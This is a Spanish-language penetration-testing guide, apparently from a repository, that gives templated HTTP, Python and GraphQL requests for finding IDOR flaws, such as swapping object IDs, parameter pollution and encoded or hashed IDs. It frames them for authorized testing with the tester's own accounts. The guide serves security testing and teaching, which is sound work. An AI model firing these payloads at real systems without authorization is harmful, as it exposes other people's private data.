# 🗡️ IDOR: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. ID en segmento de ruta

**Objetivo:** Con cuentas A y B propias, leer desde A el objeto creado por B.

```http
GET /api/objects/{ID_OBJETO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar con lectura autorizada de B y con ID inexistente. Confirmar datos privados de B, no solo 200.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 2. ID en query string

**Objetivo:** Cambiar solo el identificador de una URL observada en el tráfico real.

```http
GET /api/invoices?invoice_id={FACTURA_PROPIA_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Una factura de B devuelta a A confirma fallo horizontal; registrar identificadores redactados.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control/idor).

### 3. ID en cuerpo JSON

**Objetivo:** Consultar un resumen de objeto de B cambiando el objectId del cuerpo bajo sesión A.

```http
POST /api/objects/summary HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"objectId":"{ID_OBJETO_B}"}
```

**Interpretación:** Usar únicamente un endpoint de lectura existente; el body no deja de requerir autorización por objeto.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 4. Hijo de otro padre

**Objetivo:** Cruzar parentId y childId de dos estructuras propias para probar la relación entre ambos.

```http
GET /api/projects/{PROYECTO_A}/files/{ARCHIVO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** El archivo B debe rechazarse aunque el proyecto A sea accesible. Una política solo sobre el padre es insuficiente.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 5. Archivo estático por identificador

**Objetivo:** Pedir con A un archivo privado generado por B usando el nombre exacto conocido en el laboratorio.

```http
GET /static/exports/{ARCHIVO_PRIVADO_B}.txt HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
```

**Interpretación:** Confirmar contenido propio de B. Un nombre no adivinable reduce descubrimiento, pero no establece autorización.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control/idor).

### 6. ID codificado en Base64

**Objetivo:** Si la app codifica un correo o ID, sustituirlo por la codificación de una cuenta propia B.

```python
import base64
print(base64.urlsafe_b64encode(b"{EMAIL_PROPIO_B}").decode().rstrip("="))
```

**Interpretación:** Usar el valor en el parámetro real y comparar sesión A/B; codificar un ID no es un control de acceso.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 7. ID derivado de hash

**Objetivo:** Solo si el producto usa una transformación conocida, calcular el identificador de la cuenta propia B.

```python
import hashlib
print(hashlib.md5(b"{EMAIL_PROPIO_B}").hexdigest())
```

**Interpretación:** No asumir MD5: comprobar algoritmo y normalización observados. El hash dificulta adivinar, pero la autorización sigue obligatoria.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 8. Lista mixta de objetos

**Objetivo:** Pedir una lista que contiene un objeto propio de A y otro creado por B.

```http
POST /api/objects/batch-read HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"ids":["{ID_OBJETO_A}","{ID_OBJETO_B}"]}
```

**Interpretación:** Aplicar la política a cada elemento. El retorno de A no justifica incluir B; adaptar a un endpoint batch existente.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 9. Exportación por ID

**Objetivo:** Verificar si la ruta de exportación protege igual que la vista de un documento propio de B.

```http
GET /api/reports/{REPORTE_B}/export HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Si la vista rechaza y export entrega bytes de B, documentar ambos controles. No descargar datos ajenos.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 10. Método alternativo de lectura

**Objetivo:** Cuando el producto ofrece POST y GET equivalentes, repetir la lectura de B con el método alternativo.

```http
POST /api/objects/{ID_OBJETO_B}/view HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{}
```

**Interpretación:** Adaptar a una operación documentada o vista en tráfico; una ruta inventada con 404 no aporta señal.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 11. Contaminación de parámetro ID

**Objetivo:** Evaluar qué valor elige el backend cuando el mismo parámetro aparece dos veces.

```http
GET /api/objects?object_id={ID_OBJETO_A}&object_id={ID_OBJETO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar ambos órdenes y observar cuál objeto se devuelve. Solo es IDOR si A recibe datos privados de B.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 12. Nodo GraphQL con ID global

**Objetivo:** Consultar bajo A el node ID conocido de un objeto propio de B.

```graphql
query ObjetoDeB { node(id: "{GLOBAL_ID_OBJETO_B}") { id ... on Document { title } } }
```

**Interpretación:** Se aplica si el esquema expone node o un resolver equivalente; el ID global/Base64 no reemplaza autorización.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
